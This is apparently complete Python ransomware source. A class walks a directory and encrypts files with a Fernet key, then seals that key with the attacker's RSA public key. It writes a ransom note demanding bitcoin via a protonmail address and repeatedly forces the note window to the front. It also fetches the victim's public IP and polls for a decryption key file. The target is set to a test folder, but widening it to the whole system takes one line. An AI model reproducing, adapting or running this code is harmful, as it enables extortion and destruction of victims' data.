from cryptography.fernet import Fernet # encrypt/decrypt files on target systems 
import os # to get system root 
import webbrowser # to load up uesers browser to go to a specific websites 
import ctypes # to mess around with windows dll's so we can intereact with windows settings ex: changing windows background etc 
import urllib.request # to interact with web requests .. downloading and saving files 
import requests # used to make a request to api.ipify.org to get target machine ip address 
import time # to use timing (time.sleep interval for ransome note to decrypt system/files)
import datetime # to give time limits for ransome (in this case)
import subprocess # to open up windows applications (to create processes)
import win32gui # used to get window application header (titlebar) to check for other windows 
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used to check ransome note and decryption key on desktop 


class RansomeWare:
    # File extentions to search and encrypt 
    file_exts = [
        'txt',
        'md',
        'png',
        'exe',
        'jpg',
        'html'
    ]


    def __init__(self):
        # key that will be used for Fernet object and encrypt/decrypt method 
        self.key = None
        # Encrypt/Decrypt 
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet objects eg. Symmetric key 
        self.public_key = None

        """ Root directories to start encryption/decryption from 
        CAUTION: DO NOT use self.sysRoot on our own pc as it could end up messing our own system 
        CAUTION: create a root directory to check how it works 
        CAUTION: use localRoot as a folder and create some files into it ..  """

        # use sysRoot to create absolute path for files etc for encrypting the whole system 
        #self.sysRoot = os.path.expanduser('~')

        # use localRoot to test encryption software and for absolute path for files and encryption of "test system"
        self.localRoot = r'<test folder>' # Debugging/Testing 


        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates [symmetric key] on victim machine which is used to encrypt victims data .. 

    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key = Fernet.generate_key()
        # creates a fernet object with encrypt/decrypt method 
        self.crypter = Fernet(self.key)

    def write_key(self): 
        with open('fernet_key.txt','wb') as f: 
            f.write(self.key)

    # Encrypt [SYMMETRIC KEY] that was created on the victim machine to encrypt/decrypt files with our PUBLIC ASYMMETRIC - RSA key 
    # that was created on OUR MACHINE. we will later be able to DECRYPT the SYMMETRIC key used for ENCRYPT/DECRYPT of files on target machine
    # with our PRIVATE key so that they can DECRYPT files etc. 


    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # PUBLIC RSA key 
            self.public_key = RSA.importKey(open('public.pem').read())
            # PUBLIC encryptor object 
            public_crypter = PKCS1_OAEP.new(self.public_key)
            #Encrypted fernet key
            enc_fernet_key = public_crypter.encrypt(fernet_key)
            # write encrypted fernet key to file 
            f.write(enc_fernet_key)

        # write encrypted fernet key to desktop as well so they can send this file to be unencrypted and get system files back 
        with open(f'{self.localRoot}/EMAIL_ME.txt','wb') as fa:
            fa.write(enc_fernet_key)
        
        # Assign self.key to encrypted fernet key 
        self.key = enc_fernet_key
        # Remove fernet crypted object 
        self.crypter = None 

    
    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file: file_path: str: absolute file path eg, C:/Folder/Folder/Folder/Folder/Filename.txt 
    # def crypt_file(self, file_path, encrypted=False):
    #     with open(file_path,'rb') as f:
    #         # Read data from the file 
    #         data = f.read()
    #         if not encrypted: 
    #             # Encrypt data from file 
    #             _data = self.crypter.encrypt(data)
    #             # log file encrypted and print encrpted contents - [debugging]
    #             print('> File Encrypted ')
    #             # print(_data)

    #         else:
    #             # Decrypt data from file 
    #             _data = self.crypter.decrypt(data)
    #             # log file decrypted and print decrypted contents - [debugging]
    #             print('> File Decrypted')
    #             # print(_data)

    #     with open(file_path,'wb') as fp:
    #         # write encrypted data to the file using same filename so as to overwrite the existing file 
    #         fp.write(_data)

    
    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on the victim machine 
    def crypt_system(self,encrypted=False):
        if encrypted == False:
            system = os.walk(self.localRoot,topdown=True)
            for root, dir, files in system: 
                for file in files: 
                    file_path = os.path.join(root, file)
                    if not file.split('.')[-1] in self.file_exts:
                        continue
                    with open(file_path, 'rb') as f:
                        data = f.read()
                        _data = self.crypter.encrypt(data)
                        print('> FILE ENCRYPTED')
                    with open(file_path, 'wb') as f:
                        f.write(_data)
        else:
            system = os.walk(self.localRoot,topdown=True)
            for root, dir, files in system: 
                for file in files: 
                    file_path = os.path.join(root, file)
                    if not file.split('.')[-1] in self.file_exts:
                        continue
                    with open(file_path, 'rb') as f:
                        data = f.read()
                        _data = self.crypter.decrypt(data)
                        print('> FILE DECYRPTED')
                    with open(file_path,'wb') as fp:
                        fp.write(_data)

    @staticmethod
    def btc():
        url='https://bitcoin.org'
        # Opens the browser to https://bitcoin.org so in case they are a complete moron they will have an idea about what they'll be paying
        webbrowser.open(url)

    # def chg_desk_bkg(self):
    #     imageUrl = 'https://cdn.ttgtmedia.com/visuals/ComputerWeekly/Hero%20Images/cyber-security-ransom-encryption-1-adobe.jpg'
    #     path = f'{self.localRoot}/background.jpg'
    #     urllib.request.urlretrieve(imageUrl, path)
    #     SPI_SETDESKWALLPAPER = 20 
    #     # access windows dll's for functionality eg, changing desktop wallpaper 
    #     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)               


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOME_NOTE.txt','w') as f:
            f.write(f'''
            The harddisks of your computer have been encrypted with an Military grade encryption algorithm. 
            There is no way to restore your data without a special key.
            Only we can decrypt your files!
            
            To Purchase your key and decrypt the files please follow the below given steps:
            
            1. Email the file called EMAIL_ME.txt at {self.localRoot}/EMAIL_ME.txt to c0d3_0x@protonmail.ch
            2. Soon you will receive a bitcoin wallet address to send the ransom amount in BTC.
            3. Once we confirm the payment you will receive a mail containing the text file with the decryption key in it,
               It will decrypt all your files.
               NOTE: To decrypt the files, place the file containing key on the Desktop and wait shortly the decryption process will began
               momentarily

            WARNING: Failing to make the payment or any kind of attempts made to unlock or decrypt the files will cost more amount in ransom
            ''')

    def show_ransom_note(self):
        # Open the ransom note
        app = 'notepad.exe'
        file = 'RANSOME_NOTE.txt'
        ransom = subprocess.Popen([app, file])
        count = 0 #Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOME_NOTE - Notepad':
                print('Ransom Note is the top window - Do Noting')
                pass
            else:
                print('Ransom Note is not on the top window - kill/create process again')
                time.sleep(0.1)
                ransom.kill()
                # open ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen([app, file])
            # sleep for 10 secs
            time.sleep(10)
            count += 1 
            if count == 5:
                break

    
    # Decrypt the system when text file with unencrypted key is placed on the desktop
    def put_me_on_desktop(self):
        # loop to check the file and if file it will read the key and self.key + self.crypt will be valid for decrypting 
        # the files 
        print('started')
        while True:
            try:
                print('Trying: ')
                with open(f'{self.localRoot}/PUT_ME_ON_DESKTOP.txt','r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    print('Decrypted')
                    break
            except Exception as e:
                print('WAITING FOR DECRYPTION KEY ')
                pass
            time.sleep(10)
            print('Checking for key')


def main():
    rw = RansomeWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    # rw.chg_desk_bkg()
    rw.btc()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note())
    t2 = threading.Thread(target=rw.put_me_on_desktop())

    t1.start()
    print('> Ransomware: Attack Completed on target machine and system is encrypted ')
    print('> Ransomware: Waiting for attacker to give target machine decrypting key')
    t2.start()
    print('Target machine has been un-encrypted ')
    print('Ransomware Complete')

if __name__ == '__main__':
    main()
